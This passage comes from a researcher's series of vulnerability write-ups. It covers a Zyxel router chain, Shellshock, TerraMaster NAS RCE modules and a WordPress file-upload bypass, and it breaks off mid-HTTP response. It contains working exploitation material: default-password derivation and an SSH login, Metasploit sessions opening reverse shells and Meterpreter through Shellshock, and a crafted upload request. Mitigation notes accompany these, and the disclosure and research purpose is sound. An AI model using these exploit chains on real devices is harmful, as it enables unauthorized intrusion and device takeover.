            "DefaultPassword":"_encrypt_XXXXXXXXXXXXXX",
            "DefaultGuiPassword":"",
            "ResetDefaultPassword":false,
            "shadow":"root:$6$XXXXXXXXXXX:0::::::\n",
            "smbpasswd":"root:0:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\n",
            "ConfigAccountFromWAN":false,
            "DefPwLength":8,
            "AccountCreateTime":0,
            "AccountRetryTime":3,
            "AccountIdleTime":300,
            "AccountLockTime":300,
            "RemoHostAddress":"",
            "DotChangeDefPwd":false,
            "ShowSkipBtnInChgDefPwdPage":false,
            "AutoGenPwdBySn":false,
            "RemoteAccessPrivilege":"LAN",
            "OldDefaultPassword":"",
            "CardOrder":"",
            "ThemeColor":"",
            "HiddenPage":""
          },
          {
            "AutoShowQuickStart":false,
            "Enabled":true,
            "EnableQuickStart":true,
            "Page":"",
            "Username":"supervisor",
            "Password":"",
            "PasswordHash":"",
            "Privilege":"_encrypt_XXXXXXXXXXX",
            "DefaultPassword":"_encrypt_XXXXXXXXXXX",
            "DefaultGuiPassword":"",
            "ResetDefaultPassword":false,
            "shadow":"supervisor:$6$XXXXXXXXXX:0::::::\n",
            "smbpasswd":"supervisor:12:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:33A9D53C23525B5F63A0C536445E2B76:[U          ]:LCT-0000004E:\n",
            "ConfigAccountFromWAN":false,
            "DefPwLength":8,
            "AccountCreateTime":0,
            "AccountRetryTime":3,
            "AccountIdleTime":300,
            "AccountLockTime":300,
            "RemoHostAddress":"",
            "DotChangeDefPwd":false,
            "ShowSkipBtnInChgDefPwdPage":false,
            "AutoGenPwdBySn":false,
            "RemoteAccessPrivilege":"LAN",
            "OldDefaultPassword":"",
            "CardOrder":"",
            "ThemeColor":"",
            "HiddenPage":""
          }
        ],
        "Level":"high"
      },

---- Service Information ----
  "X_ZYXEL_RemoteManagement":{
    "Service":[
      {
        "Name":"HTTP",
        "Enable":true,
        "Protocol":6,
        "Port":8080,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":1,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"HTTPS",
        "Enable":true,
        "Protocol":6,
        "Port":443,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"FTP",
        "Enable":true,
        "Protocol":6,
        "Port":21,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"TELNET",
        "Enable":true,
        "Protocol":6,
        "Port":23,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
      {
        "Name":"SSH",
        "Enable":true,
        "Protocol":6,
        "Port":22,
        "Mode":"LAN_WAN",
        "TrustAll":true,
        "OldMode":"LAN_ONLY",
        "RestartDeamon":true,
        "LifeTime":20,
        "BoundInterfaceList":""
      },
```
Now this information disclosure in itself will not pose a direct threat to these routers, but of course attackers could try to crack the obtained encrypted shadow passwords, but this will take a long time.

So is there any other way to use the disclosed information for a successful attack?
 And of course the answer is `YES!`

The second vulnerability that comes into play is the vulnerability described in section 3 of the analysis, **"Unsafe Storage of Sensitive Data"**. 
It explains the password derivation technique used to decrypt the `_encrypted_XXXXXX` passwords in the `JSON` configuration file using a static `AES Key and IV`.
But my attention was more drawn to another analysis [Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/) done by `Thomas Rinsma` in 2020 that was referenced at the bottom of the section and where Thomas explains the password derivation techniques used on Zyxel routers.
In particular, section **"Tangent 2: key and password derivation mechanisms"** is quite interesting which describes in detail how the `supervisor` user password can be derived using the serial key of the router.

So what if we use the LFI vulnerability to get the serial key of the router and try to crack the `supervisor` password using this password derivation technique. 
We can then use the disclosed router services information  to check if `ssh` or `telnet` is enabled and accessible from the WAN and try to login as `supervisor` to gain access to the router.

`Bogi Napoleon Wennerstrøm` has reverse engineered and implemented  some of these derivation functions producing the `supervisor` password.
His repository can be found [here](https://github.com/boginw/zyxel-vmg8825-keygen) on Github.
I tested his password derivation functions and indeed I can confirm that either `zcfgBeCommonGenKeyBySerialNumMethod2` or `zcfgBeCommonGenKeyBySerialNumMethod3` are working on vulnerable Zyxel routers.

```console
# python ./main.py S000Y00000000
zcfgBeCommonGenKeyBySerialNum                   : A43338B488
zcfgBeCommonGenKeyBySerialNum_CBT               : UdcTaX78
zcfgBeCommonGenKeyBySerialNumMethod2            : 2dc1a078  <==
zcfgBeCommonGenKeyBySerialNumMethod3            : 58Pxnwdefr <==
zcfgBeCommonGenKeyBySerialNumConfigLength(1)    : EXXAY7XF
zcfgBeCommonGenKeyBySerialNumConfigLength(2)    : 4UxwvUxf
zcfgBeCommonGenKeyBySerialNumConfigLength(3)    : 4UxavUxf
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(1) : EXXAY7XF
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(2) : 4UxwvUxf
zcfgBeCommonGenKeyBySerialNumConfigLengthOld(3) : 4UxavUxf
┌──(root💀cuckoo)-[~/zyxel_exploit/zyxel-vmg8825-keygen]
└─# ssh supervisor@zyxel-vuln-router
supervisor@zyxel-vuln-router's password:
$ uname -a
Linux VMG3625-T20A 2.6.36 #7 SMP Sat Aug 18 12:18:02 CET 2018 mips GNU/Linux
$ ﻿id
uid=12(supervisor) gid=12 groups=12
$
```
I have created a `Metasploit` module that chains these two vulnerabilities together to gain access to vulnerable Zyxel routers. 
[PR submission](https://github.com/rapid7/metasploit-framework/pull/17881) to mainstream `Metasploit` is completed and available.

### Mitigation
Please follow this [Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities) of Zyxel to patch your router.
As temporary measure, you should disable all your services on the router such as `telnet`, `ftp` and `ssh` that allows access to the `supervisor` user and configure your web interface only to be accessible by the `admin` user.

### References
[CVE-2023-28770](https://www.tenable.com/cve/CVE-2023-28770)
[The enemy from within: Unauthenticated Buffer Overflows in Zyxel routers still haunting users ](https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/).
[Multiple Critical Vulnerabilities in multiple Zyxel devices](https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/).
[Getting root on a Zyxel VMG8825-T50 router](https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/)
[Zyxel VMG8825-T50 Supervisor Keygen - Github](https://github.com/boginw/zyxel-vmg8825-keygen) 
[Zyxel Security Advisory](https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities)
[ Metasploit PR: Zyxel router chained RCE using LFI and weak password derivation algorithm](https://github.com/rapid7/metasploit-framework/pull/17881)

### Credits
Credits goes to:
[SEC Consult team](https://sec-consult.com/contact/)
[Thomas Rinsma] (https://www.linkedin.com/in/thomasrinsma)
[Bogi Napoleon Wennerstrøm](https://github.com/boginw)


---

## CVE-2014-6271
*Posted 2023-05-21 · last revised 2023-05-22*

> GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka "ShellShock."  NOTE: the original fix for this issue was incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is still present after the incorrect fix.

An `Golden Oldie` from 2014 that is still very relevant nowadays.

In my recent research of security vulnerabilities, I bumped into  several targets that were still vulnerable to [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) a.k.a. `Shellshock` and [CVE-2014-6278](https://nvd.nist.gov/vuln/detail/CVE-2014-6278). You should not be surprised that most of these targets  are IoT based  with an embedded Linux/Unix image running a vulnerable `bash` version. They typically do not get updated at all and are easy targets for a malicious actor to find an entry point into the network.

Metasploit modules like  `exploit/multi/http/apache_mod_cgi_bash_env_exec`, are pretty restricted to launch an attack due to the limited platform support (only x86) and payloads that can be leveraged in an attack.  This brought me to rewrite this module a bit so that it would support multiple platforms (ARM, x86, x64, MIPS) and multiple payloads such as `Unix command` and `Linux Dropper`. The module name is `multi/http/bash_env_cgi_rce`.

To test the module locally, you download a vulnerable `bash` version from https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz. Any version published before September 2014 is okay. Just extract it in a local directory and compile it with `./configure && make`.

Configure an `Apache` or any other preferred web server to support `CGI` scripts. You can find tons of instructions on the web how to do that.
Just create a script like below using the vulnerable `bash` version and add this to the `cgi-bin` directory of your preferred web server.
```
#!/bin/bash_CVE_2014_6271
echo "Content-type: text/plain"
echo
echo
echo "Hello World"
```
Download module from [here](https://github.com/h00die-gr3y/Metasploit/blob/main/bash_env_cgi_rce.rb) and follow the [install instructions](https://github.com/h00die-gr3y/Metasploit/blob/main/README.md).
Start `msfconsole` and play around with the different options and payloads.
```
msf6 > use exploits/multi/http/bash_env_cgi_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/http/bash_env_cgi_rce) > options

Module options (exploit/multi/http/bash_env_cgi_rce):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CVE          Automatic        yes       CVE to check/exploit (Accepted: Automatic, CVE-2014-62
                                           71, CVE-2014-6278)
   HEADER       User-Agent       yes       HTTP header to use
   METHOD       GET              yes       HTTP method to use
   PAYLOADSIZE  2048             yes       Payload size used by the CmdStager
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port
                                           ][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/do
                                           cs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly
                                           generated)
   TARGETURI                     yes       Path to CGI script
   URIPATH                       no        The URI to use for this exploit (default is random)
   VHOST                         no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This mus
                                       t be an address on the local machine or 0.0.0.0 to listen
                                       on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix Command


View the full module info with the info, or info -d command.

msf6 exploit(multi/http/bash_env_cgi_rce) > set rhosts 192.168.201.10
rhosts => 192.168.201.10
msf6 exploit(multi/http/bash_env_cgi_rce) > set targeturi /cgi-bin/test.cgi
targeturi => /cgi-bin/test.cgi
msf6 exploit(multi/http/bash_env_cgi_rce) > check

[*] Target is vulnerable for CVE-2014-6271.
[*] Target is vulnerable for CVE-2014-6278.
[+] 192.168.201.10:80 - The target is vulnerable.
msf6 exploit(multi/http/bash_env_cgi_rce) > set lhost 192.168.201.10
lhost => 192.168.201.10
msf6 exploit(multi/http/bash_env_cgi_rce) > set lport 4444
lport => 4444
msf6 exploit(multi/http/bash_env_cgi_rce) > exploit

[*] Started reverse TCP handler on 192.168.201.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Target is vulnerable for CVE-2014-6271.
[*] Target is vulnerable for CVE-2014-6278.
[+] The target is vulnerable.
[*] Executing Unix Command for cmd/unix/reverse_bash using vulnerability CVE-2014-6271.
[*] Command shell session 1 opened (192.168.201.10:4444 -> 192.168.201.10:35766) at 2023-05-21 15:01:17 +0000

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux cerberus 5.15.44-Re4son-v8l+ #1 SMP PREEMPT Debian kali-pi (2022-07-03) aarch64 GNU/Linux
```
**Python Meterpreter payload example**
```
msf6 exploit(multi/http/bash_env_cgi_rce) > set payload cmd/unix/python/meterpreter/reverse_tcp
payload => cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(multi/http/bash_env_cgi_rce) > exploit

[*] Started reverse TCP handler on 192.168.201.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Target is vulnerable for CVE-2014-6271.
[*] Target is vulnerable for CVE-2014-6278.
[+] The target is vulnerable.
[*] Executing Unix Command for cmd/unix/python/meterpreter/reverse_tcp using vulnerability CVE-2014-6271.
[*] Sending stage (24772 bytes) to 192.168.201.10
[*] Meterpreter session 2 opened (192.168.201.10:4444 -> 192.168.201.10:35678) at 2023-05-21 15:03:48 +0000

meterpreter > sysinfo
Computer     : cerberus
OS           : Linux 5.15.44-Re4son-v8l+ #1 SMP PREEMPT Debian kali-pi (2022-07-03)
Architecture : aarch64
Meterpreter  : python/linux
meterpreter > getuid
Server username: www-data
meterpreter >
```
**Linux File dropper using payload:** `linux/aarch64/meterpreter_reverse_tcp`
```
msf6 exploit(multi/http/bash_env_cgi_rce) > set target 1
target => 1
msf6 exploit(multi/http/bash_env_cgi_rce) > set payload linux/aarch64/meterpreter_reverse_tcp
payload => linux/aarch64/meterpreter_reverse_tcp
msf6 exploit(multi/http/bash_env_cgi_rce) > set CMDSTAGER::FLAVOR wget
CMDSTAGER::FLAVOR => wget
msf6 exploit(multi/http/bash_env_cgi_rce) > exploit

[*] Started reverse TCP handler on 192.168.201.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Target is vulnerable for CVE-2014-6271.
[*] Target is vulnerable for CVE-2014-6278.
[+] The target is vulnerable.
[*] Executing Linux Dropper for linux/aarch64/meterpreter_reverse_tcp using vulnerability CVE-2014-6271.
[*] Using URL: http://192.168.201.10:8080/ZzirBKe
[*] Client 192.168.201.10 (Wget/1.21.3) requested /ZzirBKe
[*] Sending payload to 192.168.201.10 (Wget/1.21.3)
[*] Meterpreter session 3 opened (192.168.201.10:4444 -> 192.168.201.10:34346) at 2023-05-21 15:10:11 +0000
[*] Command Stager progress - 100.00% done (114/114 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.201.10
OS           : Debian  (Linux 5.15.44-Re4son-v8l+)
Architecture : aarch64
BuildTuple   : aarch64-linux-musl
Meterpreter  : aarch64/linux
meterpreter > getuid
Server username: www-data
meterpreter >
```
If you use `CMDSTAGER::FLAVOR` option `bourne` or `printf`, please ensure that your payload size is 2048 or below.
You can control this with the option `PAYLOADSIZE`

Have fun !!!

### References
[Metasploit module multi/http/bash_env_cgi_rce](https://github.com/h00die-gr3y/Metasploit/blob/main/bash_env_cgi_rce.rb)




 

---

## CVE-2020-35665
*Posted 2023-06-05 · last revised 2023-06-10*

> An unauthenticated command-execution vulnerability exists in TerraMaster TOS through 4.2.06 via shell metacharacters in the Event parameter in include/makecvs.php during CSV creation.

Last two weeks, I spent some time on a TerraMaster F2-221 NAS server that I got from an old friend running TerraMaster Operating System (TOS) 4.x.
Research on the Internet shows that this server is full with vulnerabilities up to `TOS 4.2.29`. Surprisingly, no `Metasploit` modules were made to exploit these NAS servers and there are still plenty of vulnerable NAS servers connected to the Internet.

So I took the liberty to write three nice modules that exploits these NAS servers targeting different vulnerabilities. 
This article is covering the first of three modules,  called `TerrorMaster 1` like we do with "good" movies released in the cinema.  You can find the articles on `TerrorMaster 2` [here](https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837) and `TerrorMaster 3` [here](https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990).

In December 2020, the  **IHTeam** reported multiple vulnerabilities on TerraMaster NAS devices running TOS version `4.2.06` or lower.
You can read their analysis/advisory [here.](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)

`TerrorMaster 1` is exploiting a vulnerability described in  [CVE-2020-35665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35665) or [CVE-2020-28188](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28188) that allows an unauthenticated attacker to create /upload a webshell  via shell metacharacters in the `Event` parameter using the vulnerable endpoint `include/makecvs.php` during the `CSV` creation process.

You can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2020_35665.rb) in my local repository or as [PR 18063](https://github.com/rapid7/metasploit-framework/pull/18063) at the Metasploit Github development.

### Mitigation
Please update your `TOS version` up to the latest supported `TOS 4.2.x` version or `TOS 5.x` version to be protected against all known vulnerabilities.
I strongly advice **NOT** to expose your TerraMaster NAS devices directly to the Internet, because you could end-up in a situation depicted below where your server has become a victim of ransomware.
![Ransomeware](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2020-35665/Screenshot_DEADBOLT.png).


### References
[IHTeam advisory](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)
[TerrorMaster 1 - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2020_35665.rb)
[TerrorMaster 1 - Metasploit PR 18063](https://github.com/rapid7/metasploit-framework/pull/18063)
[TerrorMaster 2](https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837)
[TerrorMaster 3](https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990)

### Credits
`IHTeam`
 

---

## CVE-2021-45837
*Posted 2023-06-06 · last revised 2023-06-10*

> It is possible to execute arbitrary commands as root in Terramaster F4-210, F2-210 TOS 4.2.X (4.2.15-2107141517) by sending a specifically crafted input to /tos/index.php?app/del.

This the second module in the sequel of  `TerrorMaster` releases.

`TerrorMaster 2` is based on the vulnerability analysis work of `n0tme` that was conducted in December 2021 during Christmas time.
`N0tme` discovered a few new vulnerabilities on the TerraMaster F2-210 and F4-210 model and chained them together into an unauthenticated RCE. 
The full analysis can be found here [How to summon RCEs](https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/). 

In this article, I will only quickly summarize the RCE chain and introduce the Metasploit module.

The Terramaster chained exploit uses session crafting to achieve escalated privileges that allows an attacker to access vulnerable code execution flaws. TOS versions `4.2.15` and below  are affected.
[CVE-2021-45839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45839) is exploited to obtain the first administrator's hash set up on the system as well as other information such as MAC address, by performing a `POST` request to the `/module/api.php?mobile/webNasIPS` vulnerable endpoint.
This information is used to craft an unauthenticated admin session using [CVE-2021-45841](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45841) where an attacker can self-sign session cookies by knowing the target MAC address and the user password hash.
Guest users (disabled by default) can be abused using a null/empty hash and allow an unauthenticated attacker to login as guest. This is used to download the `/etc/group` info to obtain the list of admin users, used to establish an unauthenticated admin session thru session crafting..

Finally, [CVE-2021-45837](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45837) is exploited to execute arbitrary commands as root by sending a specifically crafted input to vulnerable endpoint `/tos/index.php?app/del`.

I slightly modified the original POC where the vulnerable endpoint `/module/api.php?mobile/wapNasIPS` was used to obtain the admin hash. In some cases, it did not provide this info, whilst endpoint `/module/api.php?mobile/webNasIPS` has proven to be more reliable.

As usual, you can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2021_45837.rb) in my local repository or as [PR 18070](https://github.com/rapid7/metasploit-framework/pull/18070) at the Metasploit Github development.

### Mitigation
Please update your `TOS version` up to the latest supported `TOS 4.2.x` version or `TOS 5.x` version to be protected against all known vulnerabilities and do  **NOT** to expose your TerraMaster NAS devices directly to the Internet.

### References
[How to summon RCEs by n0tme](https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/)
[CVE-2021-45839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45839)
[CVE-2021-45841](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45841)
[CVE-2021-45837](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45837)
[TerrorMaster 2 - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2021_45837.rb)
[TerrorMaster 2 - Metasploit PR 18070](https://github.com/rapid7/metasploit-framework/pull/18070)
[TerrorMaster 1](https://attackerkb.com/topics/lXY4yjOvwx/cve-2020-35665)
[TerrorMaster 3](https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990)

### Credits
`N0tme`

---

## CVE-2022-24990
*Posted 2023-06-10 · last revised 2023-06-12*

> TerraMaster NAS 4.2.29 and earlier allows remote attackers to discover the administrative password by sending "User-Agent: TNAS" to module/api.php?mobile/webNasIPS and then reading the PWD field in the response.

This is the third exploit a.k.a. `TerrorMaster 3` targeting TerraMaster NAS devices running TerraMaster Operating System (TOS) `4.2.29` or lower.

**Octagon Networks** published in March 2022  an analysis [CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation](https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/) explaining a chain of vulnerabilities that makes all TerraMaster NAS servers running TOS version `4.2.29` and lower vulnerable for an unauthenticated RCE.

It basically combines [CVE-2022-24990: Leaking sensitive information](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24990) and [CVE-2022-24989: Authenticated remote code execution](https://www.redpacketsecurity.com/terramaster-tos-command-execution-cve-2022-24989/) to achieve an unauthenticated RCE by exploiting vulnerable endpoint `api.php?mobile/webNasIPS` leaking sensitive information such as admin password hash and mac address to achieve unauthenticated access and use the vulnerable endpoint`api.php?mobile/createRaid` with `POST` parameters `raidtype` / `diskstring` to execute remote code as root on TerraMaster NAS devices.

As usual, you can find the third module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2022_24990.rb) in my local repository or as [PR 18086](https://github.com/rapid7/metasploit-framework/pull/18086) submitted at the Metasploit Github development.

With release of `TOS 5.x`, all of these vulnerabilities are now mitigated, but I would not be surprised that in the near future, some new exploits will come to surface looking back at the ugly history of TerraMaster flaws in the past.

### Mitigation
Please update your `TOS version` up to the latest supported `TOS 4.2.x` version or `TOS 5.x` version to be protected against all known vulnerabilities and do  **NOT** to expose your TerraMaster NAS devices directly to the Internet.

### References
[CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation](https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/)
[POC 0xf4n9x](https://github.com/0xf4n9x/CVE-2022-24990)
[CVE-2022-24990](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24990)
[CVE-2022-24989](https://www.redpacketsecurity.com/terramaster-tos-command-execution-cve-2022-24989/)
[TerrorMaster 3 - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2022_24990.rb)
[TerrorMaster 3 - Metasploit PR 18086](https://github.com/rapid7/metasploit-framework/pull/18086)
[TerrorMaster 1](https://attackerkb.com/topics/lXY4yjOvwx/cve-2020-35665)
[TerrorMaster 2](https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837)

### Credits
`Octagon Networks`
`0xf4n9x`

---

## CVE-2023-2068
*Posted 2023-06-27 · last revised 2023-06-27*

> The File Manager Advanced Shortcode WordPress plugin through 2.3.2 does not adequately prevent uploading files with disallowed MIME types when using the shortcode. This leads to RCE in cases where the allowed MIME type list does not include PHP files. In the worst case, this is available to unauthenticated users.

`WordPress` is one of the most used web application platforms on the Internet with million and million of installations. The platform provides a huge amount of content with so called plugins that enables certain functionality such as payment services, file managers,  web forms, security and much more.
It is on one side great to have such rich functionality available in the platform, but the downside is that these plugins can also trigger a lot of vulnerabilities.
And  indeed, the `WordPress` platform has become infamous for the huge amount of vulnerabilities introduced at the platform over the  last couple of years.

This writeup is a perfect example where a plugin `File Manager Advanced` and  an add-on `File Manager Advanced Shortcode` introduced a vulnerability where an unauthenticated malicious actor can upload a webshell and execute payloads that provides unauthorized access to the operating system below.

Let me first explain a bit what a  `shortcode` is in the `WordPress` world.
A `shortcode` is a specially formatted text tag that opens and closes with square brackets and can be placed directly in a post or a page of your blog. This tag is automatically interpreted by `WordPress` and allows you to add features without having to program code. You can recognize a `shortcode` section by seeing brackets like `[this]`, that performs a dedicated function on your site. You can place it just about anywhere you’d like, and it will add a specific feature to your page, post, or other content. For example, you can use shortcodes to display galleries, videos, or even playlists.

`WordPress` has several plugins that delivers specific functionality that you can use and the `File Manager Advanced Shortcode` plugin is one of these features that allows you to code `File Manager Advanced ` functionality on a page or post using shortcodes.

The section below shows an example of a shortcode using the `File Manager Advanced Shortcode` plugin that allows you to upload or download files depending on the `shortcode` configuration. For instance, at the example below a login is required to upload or download files (authenticated).
```
[file_manager_advanced login="yes" roles="author,editor,administrator" path="wp-content" hide="plugins"
operations="download,upload" block_users="5" view="grid" theme="light" lang ="en" upload_allow="image/png" upload_max_size="2G"]
```
and the `shortcode` will provide the file manager functionality on the page below when published.

![File Manager Advanced Shortcode](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2023-2068/FMA_shortcode_plugin_linux_auth_rce.png).

So far, so good, but what is now exactly the issue with this plugin?

To understand this a bit better, let's first explore what is happening under the hood if we upload a small `png` file (ruby.png).
We will capture the `HTTP` request and response with `burpsuite`.
The actual upload happens with a `POST` request and form data that is shown below.
```
POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
Host: 192.168.201.10
Content-Length: 2502
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1vP3o9u9S2AIn7Ex
Accept: */*
Origin: http://192.168.201.10
Referer: http://192.168.201.10/wordpress/index.php/fma-auth/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_bbdf06293059980896f1ee8c0e8b218c=admin%7C1688056648%7CB7maHYtYiY720ai72sOLpfz8j0hSdisDFJqvoSYsqgK%7C690658a3c5dab7494d7840e3d4ecfdfdf17494f6ae163a3fd3ac8093e1529784; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbdf06293059980896f1ee8c0e8b218c=admin%7C1688056648%7CB7maHYtYiY720ai72sOLpfz8j0hSdisDFJqvoSYsqgK%7C5666c9036374c0c892b17a6abaf647dc5baf618ca489084627fde0df45b80d8f; wfwaf-authcookie-dd668d04efe9e4ab71eb81bd40139a86=1%7Cadministrator%7Cmanage_options%2Cunfiltered_html%2Cedit_others_posts%2Cupload_files%2Cpublish_posts%2Cedit_posts%2Cread%7C0f200eccb75504c01e48ae0344893dd5df62a8aad161c24058089881c58bfbfc; PHPSESSID=2csqd51ghug6138llcu5dtskjm
Connection: close

------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="reqid"

188fdc67f782e3
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="cmd"

upload
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="target"

l1_Lw
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="action"

fma_load_shortcode_fma_ui
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="_fmakey"

d2ef442bd5
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="path"

wp-content
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="url"


------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="w"

false
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="r"

true
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="hide"

plugins
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="operations"

download,upload
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="path_type"

inside
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="hide_path"

no
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="enable_trash"

no
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="upload_allow"

image/png
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="upload_max_size"

2G
------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="upload[]"; filename="ruby.png"
Content-Type: image/png

PNG
<PNG content>

------WebKitFormBoundary1vP3o9u9S2AIn7Ex
Content-Disposition: form-data; name="mtime[]"

1687884791
------WebKitFormBoundary1vP3o9u9S2AIn7Ex--
```
The question is of course, what will happen if we start manipulating the parameters in the form data and issue a POST request again.
Will that work?
Lets try an LFI, by manipulating the `path` parameter which is set to `wp-content` directory but will be set to empty (basically set to the wordpress root directory).

Surprise, surprise !!!!
ruby.png get nicely uploaded in the wordpress root directory.
```
HTTP/1.1 200 OK
Date: Tue, 27 Jun 2023 17:13:33 GMT
Server: Apache/2.4.57 (Debian)
Access-Control-Allow-Origin: http://192.168.201.10
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
